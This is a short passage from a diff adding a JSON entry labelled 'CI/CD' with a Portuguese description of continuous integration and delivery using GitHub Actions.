+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
   }
 ]
